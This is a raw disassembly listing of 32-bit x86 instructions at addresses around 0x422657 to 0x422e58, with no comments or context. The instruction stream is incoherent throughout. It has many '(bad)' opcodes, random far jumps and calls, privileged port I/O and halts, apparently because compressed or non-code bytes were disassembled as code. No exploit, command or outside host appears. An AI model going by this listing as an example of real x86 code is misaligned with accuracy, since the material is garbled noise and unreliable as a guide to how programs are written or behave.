  422657:	xor    eax,0x9b6dd951
  42265c:	lods   eax,DWORD PTR ds:[esi]
  42265d:	(bad)  [ecx+0x0]
  422660:	sbb    DWORD PTR [esi-0x57],esp
  422663:	mov    eax,0x46db409
  422668:	shr    BYTE PTR [ecx+0x65135f36],1
  42266e:	push   ebp
  42266f:	test   BYTE PTR [esi+0x22],cl
  422672:	push   cs
  422673:	loopne 0x4226e9
  422675:	or     DWORD PTR [ebx-0x66],ecx
  422678:	jb     0x422693
  42267a:	inc    ebp
  42267b:	loop   0x42264f
  42267d:	push   ebx
  42267e:	dec    eax
  42267f:	ret    
  422680:	inc    esi
  422681:	pop    ds
  422682:	stc    
  422683:	stc    
  422684:	adc    DWORD PTR [eax-0xd5178d5],ebp
  42268a:	adc    al,0xe2
  42268c:	das    
  42268d:	jo     0x422678
  42268f:	inc    edi
  422690:	arpl   WORD PTR [edi],cx
  422692:	fisubr DWORD PTR [ebp-0xd]
  422695:	xchg   edx,eax
  422696:	sbb    al,0x15
  422698:	les    eax,FWORD PTR [edx+edi*4-0x106adac4]
  42269f:	sbb    ch,BYTE PTR [edx]
  4226a1:	xor    eax,0xcd7c6a87
  4226a6:	adc    eax,0xba12e68b
  4226ab:	stos   DWORD PTR es:[edi],eax
  4226ac:	xor    DWORD PTR [eax+ecx*2-0x6af26212],0x9b7055cb
  4226b7:	(bad)  [ebx]
  4226b9:	cs pop ecx
  4226bb:	retf   
  4226bc:	lahf   
  4226bd:	aad    0xc4
  4226bf:	push   0xb2581faa
  4226c4:	cs jnp 0x422715
  4226c7:	clc    
  4226c8:	mov    ah,0x4e
  4226ca:	inc    esp
  4226cb:	dec    eax
  4226cc:	out    dx,al
  4226cd:	scas   eax,DWORD PTR es:[edi]
  4226ce:	cmp    ebx,DWORD PTR ds:0x72689972
  4226d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d5:	inc    esp
  4226d6:	loopne 0x422732
  4226d8:	push   eax
  4226d9:	or     DWORD PTR [edi+0x64],ebx
  4226dc:	ss push esp
  4226de:	mov    bh,0x98
  4226e0:	rcr    ecx,1
  4226e2:	sub    dh,al
  4226e4:	int3   
  4226e5:	dec    ebp
  4226e6:	adc    ebx,esi
  4226e8:	inc    ebp
  4226e9:	pop    esp
  4226ea:	nop
  4226eb:	imul   esp,DWORD PTR [edx-0x42f5a476],0x2b6df183
  4226f5:	mov    ah,0xbd
  4226f7:	lods   al,BYTE PTR ds:[esi]
  4226f8:	push   esp
  4226f9:	jge    0x422767
  4226fb:	ds loope 0x422690
  4226fe:	jae    0x422743
  422700:	push   ecx
  422701:	loopne 0x4226bb
  422703:	jo     0x422742
  422705:	or     al,0x24
  422707:	cmp    BYTE PTR [esi-0x3c],cl
  42270a:	pop    edi
  42270b:	ror    DWORD PTR [ebx],0x8a
  42270e:	popa   
  42270f:	cld    
  422710:	jl     0x4226c2
  422712:	std    
  422713:	sahf   
  422714:	(bad)  
  422715:	scas   al,BYTE PTR es:[edi]
  422716:	imul   esp,DWORD PTR [ebx+esi*2],0x62adee1
  42271d:	dec    ecx
  42271e:	xchg   ebx,eax
  42271f:	sti    
  422720:	ds inc esp
  422722:	outs   dx,DWORD PTR ds:[esi]
  422723:	sbb    edx,ebp
  422725:	inc    eax
  422726:	(bad)  
  422727:	jle    0x4226b2
  422729:	pop    ecx
  42272a:	lock mov ch,0xf
  42272d:	sub    cl,BYTE PTR [ebp+eiz*4+0x5e8a991f]
  422734:	jne    0x4226f3
  422736:	cli    
  422737:	loope  0x422799
  422739:	jmp    0x2581:0x117f1dda
  422740:	push   eax
  422741:	and    BYTE PTR [ebp+edi*2+0x38],dl
  422745:	jmp    0x76701151
  42274a:	inc    ebx
  42274b:	pop    ss
  42274c:	pop    DWORD PTR [ebp-0x68]
  42274f:	repz pushw 0xffa2
  422753:	or     DWORD PTR [edi],esi
  422755:	pop    es
  422756:	daa    
  422757:	xor    esi,ebp
  422759:	xchg   BYTE PTR [ecx],cl
  42275b:	pop    esp
  42275c:	imul   ecx,ebx,0x16165059
  422762:	lahf   
  422763:	in     eax,0xc5
  422765:	out    0x52,al
  422767:	rcr    DWORD PTR [edx],cl
  422769:	sbb    al,dh
  42276b:	add    DWORD PTR [ebp+0x79],ebx
  42276e:	repz dec esp
  422770:	sub    al,0x38
  422772:	bound  esi,QWORD PTR [esp+eax*4-0x3c]
  422776:	aaa    
  422777:	test   DWORD PTR [ecx],edi
  422779:	shl    eax,cl
  42277b:	jge    0x4227a5
  42277d:	cdq    
  42277e:	hlt    
  42277f:	in     eax,dx
  422780:	jl     0x422702
  422782:	icebp  
  422783:	xor    esi,eax
  422785:	and    BYTE PTR [ebp+0x5a67084b],bh
  42278b:	jnp    0x4227bb
  42278d:	sub    eax,0xaedf5bb1
  422792:	inc    ecx
  422793:	xlat   BYTE PTR ds:[ebx]
  422794:	mov    ds:0x124685b1,eax
  422799:	(bad)  [esi]
  42279b:	outs   dx,DWORD PTR ds:[esi]
  42279c:	mov    bl,0xd7
  42279e:	push   esp
  42279f:	push   ss
  4227a0:	adc    DWORD PTR [ecx],ebx
  4227a2:	adc    esi,ecx
	...
  4227b0:	add    BYTE PTR [edi+0x75],ah
  4227b3:	int3   
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	rol    DWORD PTR [edx-0x5f8e40d0],1
  4227c3:	add    DWORD PTR [eax],eax
  4227c5:	stos   DWORD PTR es:[edi],eax
  4227c6:	add    eax,DWORD PTR [eax]
  4227c8:	add    BYTE PTR [eax],dh
  4227ca:	enter  0x354e,0x1a
  4227ce:	sbb    cl,bl
  4227d0:	sub    dh,BYTE PTR [eax]
  4227d2:	dec    edi
  4227d3:	clc    
  4227d4:	push   0x955c4164
  4227d9:	pop    ebp
  4227da:	(bad)  
  4227db:	call   0xad40e3b7
  4227e0:	and    al,0x6c
  4227e2:	mov    ebx,0x62d7ca15
  4227e7:	xchg   DWORD PTR [esi],edx
  4227e9:	lds    edx,FWORD PTR [edi-0x61e6f105]
  4227ef:	scas   eax,DWORD PTR es:[edi]
  4227f0:	mov    al,ds:0xd3b86586
  4227f5:	(bad)  
  4227f6:	fcmovnb st,st(4)
  4227f8:	pop    ds
  4227f9:	jns    0x422781
  4227fb:	and    al,0x21
  4227fd:	xor    DWORD PTR [ebx],eax
  4227ff:	ins    BYTE PTR es:[edi],dx
  422800:	jp     0x42287e
  422802:	fadd   QWORD PTR ds:0x1e46070
  422808:	in     al,0xde
  42280a:	rol    dl,0xb2
  42280d:	or     ebx,DWORD PTR [edi-0x17]
  422810:	jae    0x42279f
  422812:	pop    ebx
  422813:	in     al,dx
  422814:	and    al,0x15
  422816:	push   ebx
  422817:	sbb    eax,0x35ef1e06
  42281c:	ins    BYTE PTR es:[edi],dx
  42281d:	or     al,0xdb
  42281f:	lods   al,BYTE PTR ds:[esi]
  422820:	test   BYTE PTR [ebp+0x13c4609d],cl
  422826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422827:	hlt    
  422828:	dec    esi
  422829:	jge    0x42285e
  42282b:	aas    
  42282c:	inc    ebx
  42282d:	out    dx,al
  42282e:	sbb    eax,0x3a65e14c
  422833:	rol    BYTE PTR [ebx-0x34],cl
  422836:	jae    0x4228b1
  422838:	aam    0xd6
  42283a:	jmp    0xcd4b:0xf130ef82
  422841:	and    DWORD PTR [esi-0x78d6bd2d],ecx
  422847:	or     BYTE PTR [edi],ch
  422849:	(bad)  
  42284b:	repz sub eax,0xafa8c556
  422851:	neg    DWORD PTR [esp+ebp*1+0x6a]
  422855:	sar    BYTE PTR [ebx+edx*4],cl
  422858:	fisttp WORD PTR [eax-0x4da067ed]
  42285e:	mov    edx,0x790aaba0
  422863:	int3   
  422864:	out    0xfd,al
  422866:	mov    edi,eax
  422868:	adc    al,0x8c
  42286a:	adc    ebp,eax
  42286c:	loope  0x4227f5
  42286e:	scas   al,BYTE PTR es:[edi]
  42286f:	rcr    DWORD PTR [ebx-0x7d],cl
  422872:	popf   
  422873:	jecxz  0x4228ea
  422875:	aam    0x77
  422877:	aad    0xc2
  422879:	push   ss
  42287a:	pop    ebp
  42287b:	mov    edi,0x8ba7d9dc
  422880:	and    al,0x0
  422882:	lea    esp,ds:0x1d7eab5d
  422888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422889:	add    ah,bh
  42288b:	pop    esp
  42288c:	mov    al,bh
  42288e:	addr16 daa 
  422890:	dec    eax
  422891:	sub    eax,0x3d5df3be
  422896:	fiadd  WORD PTR [ebx+0x3b]
  422899:	into   
  42289a:	xlat   BYTE PTR ds:[ebx]
  42289b:	arpl   WORD PTR [esi-0x4b],sp
  42289e:	jnp    0x42285d
  4228a0:	mov    al,ds:0x703bd23c
  4228a5:	ret    0xa494
  4228a8:	add    esi,DWORD PTR [ebp-0x5a92432d]
  4228ae:	outs   dx,BYTE PTR ds:[esi]
  4228af:	or     eax,0x3caf3ae9
  4228b4:	push   0xf00632a9
  4228b9:	rcl    DWORD PTR ss:0x730f468b,1
  4228c0:	cdq    
  4228c1:	and    bh,bh
  4228c3:	add    ecx,DWORD PTR [ebx]
  4228c5:	in     eax,0xb8
  4228c7:	sub    al,0xe4
  4228c9:	lods   eax,DWORD PTR ds:[esi]
  4228ca:	dec    edi
  4228cb:	jmp    0x30512227
  4228d0:	mov    eax,0x53c3f579
  4228d5:	push   eax
  4228d6:	cmp    eax,0xb3341ea8
  4228db:	mov    ds:0x730275b2,eax
  4228e0:	mov    bh,0xe
  4228e2:	out    0x65,eax
  4228e4:	mov    ds:0x3d1a4cba,eax
  4228e9:	mov    ebx,0x59e1168d
  4228ee:	or     edx,DWORD PTR [edi-0x69]
  4228f1:	int3   
  4228f2:	bound  ebp,QWORD PTR [esi-0x357c2597]
  4228f8:	cli    
  4228f9:	cmp    edx,DWORD PTR [ebp-0x1128eca4]
  4228ff:	lock add DWORD PTR [ecx],edx
  422902:	mov    edi,0x186bfd60
  422908:	(bad)
  42290c:	das    
  42290d:	rcl    esp,cl
  42290f:	xchg   edx,eax
  422910:	(bad)  [ecx]
  422912:	mov    ds:0x723f6306,al
  422917:	jnp    0x42297d
  422919:	rcr    BYTE PTR [edx-0x5187a6e3],cl
  42291f:	lea    eax,[esi+0x40]
  422922:	mov    ?,WORD PTR [eax]
  422924:	sub    DWORD PTR [edx+eax*1-0x50],0xffffffa8
  422929:	adc    ch,dl
  42292b:	fwait
  42292c:	arpl   WORD PTR [ebx],sp
  42292e:	std    
  42292f:	sbb    eax,DWORD PTR [ecx-0x5d5f4db2]
  422935:	cmc    
  422936:	adc    BYTE PTR [edi],dl
  422938:	sbb    bh,BYTE PTR [eax+0x9]
  42293b:	add    BYTE PTR [ecx],ah
  42293d:	push   0xffffffe0
  42293f:	dec    ecx
  422940:	aaa    
  422941:	pop    esi
  422942:	retf   
  422943:	jp     0x4228ec
  422945:	rcr    BYTE PTR [ecx],1
  422947:	pop    esp
  422948:	cmp    eax,0x903aeaf8
  42294d:	xor    edx,DWORD PTR [ecx]
  42294f:	in     al,0xe0
  422951:	lods   al,BYTE PTR ds:[esi]
  422952:	add    BYTE PTR ds:0xae1ea13,dh
  422958:	out    dx,al
  422959:	mov    ch,BYTE PTR [esi+0x6d9ec49e]
  42295f:	inc    eax
  422960:	aas    
  422961:	cld    
  422962:	pop    esp
  422963:	gs cmp al,0xfd
  422966:	lods   al,BYTE PTR ds:[esi]
  422967:	jmp    0xf2b139c7
  42296c:	mov    bl,0x48
  42296e:	dec    BYTE PTR [ebp+0x610f4a50]
  422974:	adc    al,0x95
  422976:	sub    DWORD PTR [edi],ecx
  422978:	scas   eax,DWORD PTR es:[edi]
  422979:	mov    bl,0x55
  42297b:	or     bl,bl
  42297d:	xchg   esi,eax
  42297e:	rol    BYTE PTR [edx],1
  422980:	imul   edi,edi,0x4f
  422983:	and    BYTE PTR [esi],ch
  422985:	push   edi
  422986:	mov    edi,0xad76e765
  42298b:	inc    edi
  42298c:	push   ecx
  42298d:	(bad)  
  42298f:	ret    
  422990:	dec    edi
  422991:	shl    BYTE PTR [ecx-0x34],0x37
  422995:	pop    ebp
  422996:	shl    BYTE PTR [eax],0x7d
  422999:	xchg   edx,eax
  42299a:	aad    0x12
  42299c:	jmp    0x757e9e01
  4229a1:	fsub   QWORD PTR [ebx]
  4229a3:	and    al,0xef
  4229a5:	rcr    DWORD PTR [edi],cl
  4229a7:	add    cl,BYTE PTR [ebx+0x24e6d95d]
  4229ad:	stos   DWORD PTR es:[edi],eax
  4229ae:	out    dx,al
  4229af:	sbb    al,0x42
  4229b1:	xchg   ebx,eax
  4229b2:	sub    eax,0x69a05103
  4229b7:	pop    ebx
  4229b8:	inc    esi
  4229b9:	or     al,0xbc
  4229bb:	dec    BYTE PTR [edi]
  4229bd:	jmp    0x25ca:0x4b4945f1
  4229c4:	mov    ebp,0xdd2b55db
  4229c9:	jecxz  0x422989
  4229cb:	adc    ebp,DWORD PTR [edi+ecx*4+0x740e197a]
  4229d2:	out    0xe6,eax
  4229d4:	fistp  WORD PTR [ebx-0x6c5b88d9]
  4229da:	push   eax
  4229db:	(bad)  
  4229dc:	aad    0x3b
  4229de:	jmp    DWORD PTR gs:[eax-0x4610b3bd]
  4229e5:	ret    
  4229e6:	push   eax
  4229e7:	push   ss
  4229e8:	pusha  
  4229e9:	ds jns 0x4229aa
  4229ec:	loop   0x422a32
  4229ee:	xchg   edx,eax
  4229ef:	lods   eax,DWORD PTR ds:[esi]
  4229f0:	(bad)
  4229f3:	push   0x2f412587
  4229f8:	ins    DWORD PTR es:[edi],dx
  4229f9:	jae    0x422a63
  4229fb:	and    al,BYTE PTR [edi]
  4229fd:	xchg   BYTE PTR [ebp*8+0x2866fc0a],dl
  422a04:	xchg   esi,eax
  422a05:	mov    eax,ds:0x98cda945
  422a0a:	int    0x19
  422a0c:	mov    ss,WORD PTR [ebx]
  422a0e:	hlt    
  422a0f:	inc    edx
  422a10:	dec    ebx
  422a11:	cs je  0x422a49
  422a14:	mov    esi,0x84dcd6a3
  422a19:	mov    edx,0xe4d38fdc
  422a1e:	and    eax,0x281b2a2c
  422a23:	call   FWORD PTR [eax+0x7c]
  422a26:	xchg   BYTE PTR [ebx-0x156ada2a],cl
  422a2c:	into   
  422a2d:	xchg   bl,al
  422a2f:	fnstcw WORD PTR [eax+eax*8-0x1e]
  422a33:	retf   0x40e0
  422a36:	pop    edi
  422a37:	shr    ebp,1
  422a39:	or     BYTE PTR [edx+0x1d851707],al
  422a3f:	dec    eax
  422a40:	clc    
  422a41:	ror    DWORD PTR [eax+0x49c1e6e5],1
  422a47:	inc    esi
  422a48:	fidivr DWORD PTR [edi]
  422a4a:	adc    al,0x89
  422a4c:	sbb    cl,BYTE PTR [esi]
  422a4e:	jne    0x422aa9
  422a50:	jmp    0x99c9:0x83569fc6
  422a57:	daa    
  422a58:	adc    eax,0x248f53d1
  422a5d:	data16 jnp 0x422a5f
  422a60:	addr16 aas 
  422a62:	stos   BYTE PTR es:[edi],al
  422a63:	sbb    DWORD PTR [esi+0x6a01964f],0x2e
  422a6a:	stos   DWORD PTR es:[edi],eax
  422a6b:	sub    edx,DWORD PTR [ecx-0x1caa40fc]
  422a71:	mov    BYTE PTR [esi-0x65],bl
  422a74:	sbb    BYTE PTR [ebx-0x2b],0x27
  422a78:	inc    esp
  422a79:	jmp    FWORD PTR [edi*8+0x79a8da5f]
  422a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a81:	in     eax,dx
  422a82:	out    dx,eax
  422a83:	(bad)  
  422a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a85:	pop    edx
  422a86:	test   DWORD PTR [ebp-0x56],0x8130055b
  422a8d:	aad    0x38
  422a8f:	test   DWORD PTR [edx-0x246b3e5],edi
  422a95:	dec    esp
  422a96:	mov    ecx,0xe1dce116
  422a9b:	pop    ds
  422a9c:	loope  0x422a94
  422a9e:	push   esi
  422a9f:	and    edi,0x7d
  422aa2:	sbb    eax,0x1c84e25
  422aa7:	xor    cl,bl
  422aa9:	mov    esp,0xc11745d1
  422aae:	(bad)  
  422aaf:	mov    esp,0xe4c3076c
  422ab4:	call   0x762c3554
  422ab9:	rol    BYTE PTR [edx+0x17f35b75],cl
  422abf:	xchg   esi,eax
  422ac0:	lock dec esi
  422ac2:	pusha  
  422ac3:	and    ecx,DWORD PTR [ecx+ebp*8]
  422ac6:	shl    BYTE PTR [edi+0x3f],1
  422ac9:	and    dh,BYTE PTR [edx]
  422acb:	add    eax,0xafade4e6
  422ad0:	in     al,dx
  422ad1:	dec    ebx
  422ad2:	mov    BYTE PTR [ebp+0x61a3b97],ch
  422ad8:	aad    0x87
  422ada:	push   esp
  422adb:	data16 je 0x422a63
  422ade:	jne    0x422a6f
  422ae0:	or     bh,BYTE PTR [edi+0x1d9d6a47]
  422ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ae7:	xchg   ebp,eax
  422ae8:	(bad)  
  422ae9:	sub    DWORD PTR [edx],ebx
  422aeb:	out    dx,al
  422aec:	pushf  
  422aed:	aaa    
  422aee:	adc    ch,ch
  422af0:	lea    ebp,[eax+0x6e]
  422af3:	imul   eax,DWORD PTR [ebx],0x60d4a77f
  422af9:	js     0x422b21
  422afb:	jmp    0x2a54:0x6d80f5b6
  422b02:	into   
  422b03:	jb     0x422b08
  422b05:	jns    0x422b74
  422b07:	je     0x422ac1
  422b09:	adc    BYTE PTR ds:0x1cc61d3f,dh
  422b0f:	mov    edi,0xb67c9681
  422b14:	push   ss
  422b15:	mov    WORD PTR [ebx+eiz*4],ds
  422b18:	in     eax,0x93
  422b1a:	outs   dx,DWORD PTR ds:[esi]
  422b1b:	or     eax,0x2fff4463
  422b20:	jl     0x422b6f
  422b22:	or     DWORD PTR [edi+0x57],ebp
  422b25:	mov    eax,0x168645a0
  422b2a:	add    BYTE PTR [ecx+0x1b],0x2c
  422b2e:	je     0x422ab2
  422b30:	(bad)
  422b33:	(bad)  
  422b34:	and    DWORD PTR [edi+0xbefdb13],ebp
  422b3a:	push   esp
  422b3b:	sub    dh,ch
  422b3d:	icebp  
  422b3e:	int    0xb5
  422b40:	mov    ds:0xbddbe799,eax
  422b45:	nop
  422b46:	mov    WORD PTR [esi+0x58],ds
  422b49:	jmp    0x6ad3:0xcf87192a
  422b50:	cmp    BYTE PTR [ecx+0x5b],dl
  422b53:	or     eax,0x4c8141b0
  422b58:	les    edi,FWORD PTR [esi+esi*4-0x5a7ba024]
  422b5f:	push   edi
  422b60:	xchg   esp,eax
  422b61:	jl     0x422bca
  422b63:	iret   
  422b64:	int    0x82
  422b66:	outs   dx,DWORD PTR ds:[esi]
  422b67:	push   eax
  422b68:	sti    
  422b69:	in     eax,0xae
  422b6b:	xor    dh,BYTE PTR ds:0xc2202c86
  422b71:	and    DWORD PTR [ebx+0x12],0x0
	...
  422b81:	mov    al,ds:0xbc09b42c
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    cl,bl
  422b8e:	sahf   
  422b8f:	add    al,0x5a
  422b91:	sbb    al,0xa4
  422b93:	add    DWORD PTR [eax],eax
  422b95:	stos   DWORD PTR es:[edi],eax
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    cl,bh
  422b9a:	mov    bl,0x0
  422b9c:	cdq    
  422b9d:	mov    fs,WORD PTR cs:[edi+0x30]
  422ba1:	pop    ecx
  422ba2:	pop    ebp
  422ba3:	mov    esi,0x63e8e110
  422ba8:	or     esp,eax
  422baa:	shl    BYTE PTR [ecx+0x1b],1
  422bad:	ror    DWORD PTR ds:[ebx+0x66],cl
  422bb1:	stos   DWORD PTR es:[edi],eax
  422bb2:	push   0x14
  422bb4:	pop    es
  422bb5:	test   dl,0x4c
  422bb8:	retf   0x6f25
  422bbb:	enter  0x3d56,0xf0
  422bbf:	add    al,0x4c
  422bc1:	in     al,0x6c
  422bc3:	adc    al,0xa4
  422bc5:	arpl   ax,si
  422bc7:	jmp    0x57c335c1
  422bcc:	cli    
  422bcd:	push   eax
  422bce:	adc    cl,ah
  422bd0:	cmp    eax,0xfc5160d2
  422bd5:	jmp    DWORD PTR [edi-0x56]
  422bd8:	jmp    0x13e51329
  422bdd:	sar    BYTE PTR [eiz*2+0x36b09819],cl
  422be4:	sahf   
  422be5:	cld    
  422be6:	aas    
  422be7:	adc    eax,0x2aa95722
  422bec:	ins    BYTE PTR es:[edi],dx
  422bed:	dec    edx
  422bee:	xor    dh,bh
  422bf0:	fdivr  QWORD PTR [ebx]
  422bf2:	in     al,dx
  422bf3:	daa    
  422bf4:	sub    al,0x35
  422bf6:	pop    ebx
  422bf7:	and    al,cl
  422bf9:	or     cl,al
  422bfb:	dec    edx
  422bfc:	xchg   BYTE PTR [esi-0x28b7943c],dh
  422c02:	fistp  QWORD PTR [esi]
  422c04:	(bad)  
  422c06:	and    ecx,DWORD PTR [ecx]
  422c08:	or     BYTE PTR [edx+edx*2],cl
  422c0b:	push   ds
  422c0c:	in     eax,0x6d
  422c0e:	mov    esp,0x7cfa7b8e
  422c13:	ins    DWORD PTR es:[edi],dx
  422c14:	lahf   
  422c15:	ins    BYTE PTR es:[edi],dx
  422c16:	outs   dx,BYTE PTR ds:[esi]
  422c17:	in     eax,dx
  422c18:	cmp    eax,0x21f0208e
  422c1d:	jb     0x422bc4
  422c1f:	cld    
  422c20:	and    DWORD PTR [esi+0x504c5885],edi
  422c26:	dec    ecx
  422c27:	xchg   ebp,eax
  422c28:	lahf   
  422c29:	daa    
  422c2a:	pop    ss
  422c2b:	dec    ebp
  422c2c:	push   es
  422c2d:	sar    DWORD PTR [ebx+0x31],cl
  422c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c31:	in     al,dx
  422c32:	jge    0x422c06
  422c34:	in     eax,0x90
  422c36:	lds    eax,FWORD PTR [ebp+0x1589b141]
  422c3c:	jle    0x422c49
  422c3e:	pop    edi
  422c3f:	fst    DWORD PTR [esi+0x12]
  422c42:	inc    ecx
  422c43:	fs xchg edx,eax
  422c45:	repnz push edx
  422c47:	jbe    0x422c24
  422c49:	mov    edi,0xc5a75a06
  422c4e:	stos   BYTE PTR es:[edi],al
  422c4f:	mov    ch,0x44
  422c51:	test   BYTE PTR [esi-0x42],cl
  422c54:	sub    edx,DWORD PTR [ebp+eiz*1+0x29fb74b3]
  422c5b:	lds    eax,FWORD PTR [ecx]
  422c5d:	jmp    0x422bed
  422c5f:	lea    esi,[edi]
  422c61:	or     al,0xc0
  422c63:	stos   DWORD PTR es:[edi],eax
  422c64:	(bad)  
  422c65:	pushf  
  422c66:	push   esp
  422c67:	sub    eax,0xb58173b4
  422c6c:	mov    WORD PTR [ecx+0x49],?
  422c6f:	fwait
  422c70:	inc    edx
  422c71:	scas   al,BYTE PTR es:[edi]
  422c72:	fst    QWORD PTR [ecx]
  422c74:	scas   al,BYTE PTR es:[edi]
  422c75:	outs   dx,DWORD PTR ds:[esi]
  422c76:	sbb    DWORD PTR [ecx-0x75c0148e],ecx
  422c7c:	mov    DWORD PTR [esi-0x650be0],ebx
  422c82:	push   0xffffffca
  422c84:	cs clc 
  422c86:	xchg   ebp,eax
  422c87:	call   0xa32a:0xc7631a6b
  422c8e:	test   DWORD PTR [ecx-0x83b7d9c],ecx
  422c94:	pop    ss
  422c95:	ds xchg ecx,eax
  422c97:	(bad)  
  422c98:	stos   BYTE PTR es:[edi],al
  422c99:	inc    esp
  422c9a:	jmp    0x6c7b:0x6fa062eb
  422ca1:	frstor [esi+ebp*2]
  422ca4:	es lahf 
  422ca6:	jge    0x422cba
  422ca8:	imul   edx,esi,0xb4316e5c
  422cae:	inc    edi
  422caf:	xlat   BYTE PTR ds:[ebx]
  422cb0:	dec    ecx
  422cb1:	or     esi,0x36
  422cb4:	stc    
  422cb5:	sahf   
  422cb6:	iret   
  422cb7:	ins    BYTE PTR es:[edi],dx
  422cb8:	cmp    ebp,DWORD PTR [edi-0x49a6ee18]
  422cbe:	fld    TBYTE PTR [ebp+0x4247b3de]
  422cc4:	xchg   edi,eax
  422cc5:	aam    0xba
  422cc7:	xchg   bx,ax
  422cc9:	int    0xed
  422ccb:	ficom  DWORD PTR [eax]
  422ccd:	in     al,dx
  422cce:	push   0x86c80dfb
  422cd3:	pop    ebp
  422cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cd5:	cmp    edx,DWORD PTR [edx+0x55]
  422cd8:	bound  edi,QWORD PTR [ecx]
  422cda:	inc    edi
  422cdb:	icebp  
  422cdc:	mov    ebx,0x61a2934
  422ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ce2:	or     dh,0xe4
  422ce5:	and    BYTE PTR [ebx],0x58
  422ce8:	sti    
  422ce9:	inc    ecx
  422cea:	ret    0x3a3
  422ced:	and    eax,0x4e3e5253
  422cf2:	rcl    DWORD PTR [esi+0x287dbdba],0xe0
  422cf9:	scas   al,BYTE PTR es:[edi]
  422cfa:	pop    eax
  422cfb:	or     DWORD PTR [ecx+0x7ac997c0],ebx
  422d01:	rcl    DWORD PTR [ecx],1
  422d03:	test   edi,edi
  422d05:	in     al,0x6e
  422d07:	add    BYTE PTR [ecx],al
  422d09:	mov    edi,0xc5b6a853
  422d0e:	repnz pushf 
  422d10:	add    DWORD PTR [ebx-0x5207c1d6],esi
  422d16:	fidivr DWORD PTR [eax-0x3c]
  422d19:	rcr    BYTE PTR [eax],1
  422d1b:	lock xor al,bh
  422d1e:	and    BYTE PTR [ebp+0xe848a21],ah
  422d24:	mov    al,ds:0x61d3dc06
  422d29:	sbb    eax,0xb1eda47a
  422d2e:	mov    eax,ds:0xea66fc6e
  422d33:	push   0xffffff9d
  422d35:	jmp    0x422d22
  422d37:	mov    esi,0xbcf13b5
  422d3c:	xor    eax,0x64181bb
  422d41:	or     esp,DWORD PTR [edx+edi*4]
  422d44:	pop    edx
  422d45:	fdiv   QWORD PTR [edx+eax*8-0x14033e77]
  422d4c:	mov    esp,0x41a379a4
  422d51:	push   cs
  422d52:	or     bl,0x9a
  422d55:	(bad)  
  422d56:	jnp    0x422dc6
  422d58:	mov    al,ds:0x10a8b7d1
  422d5d:	fnstenv [ebx+0x409f153c]
  422d63:	jno    0x422d58
  422d65:	test   eax,0xc8a2b4c7
  422d6a:	icebp  
  422d6b:	add    DWORD PTR [edi+0x8],esp
  422d6e:	dec    esp
  422d6f:	mov    dh,0xb6
  422d71:	lds    esp,FWORD PTR [edi+0x22]
  422d74:	and    eax,edx
  422d76:	hlt    
  422d77:	pusha  
  422d78:	push   ebx
  422d79:	cmp    DWORD PTR [edi-0x38],eax
  422d7c:	dec    ebp
  422d7d:	dec    DWORD PTR [edx-0x3b2160c3]
  422d83:	mov    ds:0xc045c276,eax
  422d88:	loope  0x422df2
  422d8a:	cmp    esp,DWORD PTR [edx+0x30d82841]
  422d90:	test   edi,0xfd0fbae5
  422d96:	in     eax,0x3b
  422d98:	dec    edx
  422d99:	shr    ah,0xb6
  422d9c:	push   eax
  422d9d:	fisub  DWORD PTR [edi]
  422d9f:	fiadd  DWORD PTR [ebx-0x2fd2eea4]
  422da5:	dec    ecx
  422da6:	mov    esi,0xa8facea
  422dab:	js     0x422de4
  422dad:	pop    esi
  422dae:	adc    BYTE PTR [edi+0x3b7b01fa],ch
  422db4:	jg     0x422d5e
  422db6:	pop    ebp
  422db7:	cs adc eax,0x60ad86c0
  422dbd:	call   0xe0d8:0xe5269c03
  422dc4:	xchg   ebx,eax
  422dc5:	and    ebp,DWORD PTR [edi+0x4e157b09]
  422dcb:	xchg   ebp,eax
  422dcc:	gs mov eax,0xfc6c8341
  422dd2:	push   edx
  422dd3:	in     al,dx
  422dd4:	retf   
  422dd5:	rol    BYTE PTR [ebx-0x4fcfb332],cl
  422ddb:	daa    
  422ddc:	leave  
  422ddd:	data16 sbb cl,BYTE PTR [edi-0x6121407a]
  422de4:	mov    WORD PTR [ecx],cs
  422de6:	fnsetpm(287 only) 
  422de8:	mov    bl,0xa7
  422dea:	ja     0x422e43
  422dec:	fdivr  QWORD PTR [esi+0x79db810b]
  422df2:	in     eax,0xb6
  422df4:	mov    eax,0x4e517cfc
  422df9:	inc    edx
  422dfa:	mov    ch,BYTE PTR [esi+edi*1-0x7a]
  422dfe:	mov    ebx,0x66e73ebc
  422e03:	or     eax,DWORD PTR [edi]
  422e05:	loop   0x422e19
  422e07:	jg     0x422df4
  422e09:	not    BYTE PTR [edx+eax*1]
  422e0c:	mov    eax,0xd9144d74
  422e11:	sub    ch,cl
  422e13:	cld    
  422e14:	inc    esi
  422e15:	int3   
  422e16:	js     0x422db2
  422e18:	imul   bl
  422e1a:	rol    BYTE PTR [ebx],0xcb
  422e1d:	out    0x9d,eax
  422e1f:	jae    0x422dd9
  422e21:	jns    0x422e7e
  422e23:	adc    ebp,ebx
  422e25:	xor    eax,0x2937ade2
  422e2a:	out    dx,eax
  422e2b:	cmp    eax,0x2daa88f5
  422e30:	mov    ah,0x3d
  422e32:	sahf   
  422e33:	sub    bl,al
  422e35:	mov    bl,0xec
  422e37:	ror    DWORD PTR [edi+0x20],0x75
  422e3b:	mov    ebx,0xeb70a0dd
  422e40:	ret    
  422e41:	xchg   BYTE PTR [esi],ch
  422e43:	mov    dh,0xd1
  422e45:	push   ebx
  422e46:	dec    edi
  422e47:	lock leavew 
  422e4a:	and    DWORD PTR [eax],edi
  422e4c:	imul   edx,esp,0x69
  422e4f:	xchg   DWORD PTR [ebx],edi
  422e51:	push   0x1b
  422e53:	jmp    0xe0a9c206
  422e58:	push   ebx
